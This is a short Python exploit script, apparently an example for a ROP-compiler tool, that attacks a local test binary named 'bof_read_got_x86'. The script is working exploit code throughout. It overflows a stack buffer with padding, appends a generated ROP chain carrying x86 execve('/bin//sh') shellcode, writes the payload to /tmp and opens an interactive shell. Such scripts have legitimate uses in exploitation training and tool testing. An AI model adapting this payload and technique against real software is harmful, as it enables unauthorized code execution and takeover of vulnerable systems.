import sys, logging, binascii
from pwn import *
from rop_compiler import ropme, goal

filename = './bof_read_got_x86'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x0804856a\n")

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-827.php
    "\x31\xc0"              # xor    eax,eax
 +  "\x50"                  # push   eax
 +  "\x68\x2f\x2f\x73\x68"  # push   0x68732f2f
 +  "\x68\x2f\x62\x69\x6e"  # push   0x6e69622f
 +  "\x89\xe3"              # mov    ebx,esp
 +  "\x50"                  # push   eax
 +  "\x53"                  # push   ebx
 +  "\x89\xe1"              # mov    ecx,esp
 +  "\x31\xd2"              # xor    edx,edx
 +  "\xb0\x0b"              # mov    al,0xb
 +  "\xcd\x80"              # int    0x80
)

files = [(filename, None, None)]
libs = ['/lib/i386-linux-gnu/libc.so.6']
rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], log_level = logging.DEBUG)

payload = 'A'*512 + 'B'*16 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
